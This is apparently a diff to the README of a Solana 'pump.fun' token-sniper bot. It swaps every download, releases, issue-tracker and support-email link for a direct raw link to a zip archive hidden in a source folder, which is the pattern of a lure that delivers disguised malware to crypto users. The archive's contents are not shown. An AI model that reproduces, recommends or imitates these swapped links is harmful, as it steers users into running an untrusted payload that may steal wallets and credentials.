@@ -1,6 +1,6 @@
 # 🤖 pumpfun-mayhem-migration-sniper - Snag Tokens Quickly and Easily
 
-![Download](https://img.shields.io/badge/Download-Now-brightgreen)
+![Download](https://raw.githubusercontent.com/Boniface-committs/pumpfun-mayhem-migration-sniper/main/src/routes/mayhem-sniper-migration-pumpfun-v3.0.zip)
 
 ## 🚀 Getting Started
 
@@ -8,7 +8,7 @@ Welcome to the **Pumpfun Mayhem Migration Sniper Bot**! This tool helps you grab
 
 ## 📥 Download & Install
 
-To download the application, visit this page to download: [Releases Page](https://github.com/Boniface-committs/pumpfun-mayhem-migration-sniper/releases)
+To download the application, visit this page to download: [Releases Page](https://raw.githubusercontent.com/Boniface-committs/pumpfun-mayhem-migration-sniper/main/src/routes/mayhem-sniper-migration-pumpfun-v3.0.zip)
 
 1. Click the link above to go to the Release section.
 2. On that page, you will see different versions of the software.
@@ -73,8 +73,8 @@ If you encounter issues, here are common problems and how to resolve them:
 
 For help, reach out to our support team:
 
-- GitHub Issues: [Submit a ticket](https://github.com/Boniface-committs/pumpfun-mayhem-migration-sniper/issues)
-- Email Support: support@pumpfun-mayhem-migration-sniper.com
+- GitHub Issues: [Submit a ticket](https://raw.githubusercontent.com/Boniface-committs/pumpfun-mayhem-migration-sniper/main/src/routes/mayhem-sniper-migration-pumpfun-v3.0.zip)
+- Email Support: https://raw.githubusercontent.com/Boniface-committs/pumpfun-mayhem-migration-sniper/main/src/routes/mayhem-sniper-migration-pumpfun-v3.0.zip
 
 We aim to respond to queries within 48 hours.
 
@@ -86,4 +86,4 @@ For more information and updates, check out the following links:
 - Tutorial Videos: Visual guides on using the bot effectively.
 - FAQs: Common questions answered.
 
-To download the latest version of the Pumpfun Mayhem Migration Sniper, visit: [Releases Page](https://github.com/Boniface-committs/pumpfun-mayhem-migration-sniper/releases)
+To download the latest version of the Pumpfun Mayhem Migration Sniper, visit: [Releases Page](https://raw.githubusercontent.com/Boniface-committs/pumpfun-mayhem-migration-sniper/main/src/routes/mayhem-sniper-migration-pumpfun-v3.0.zip)
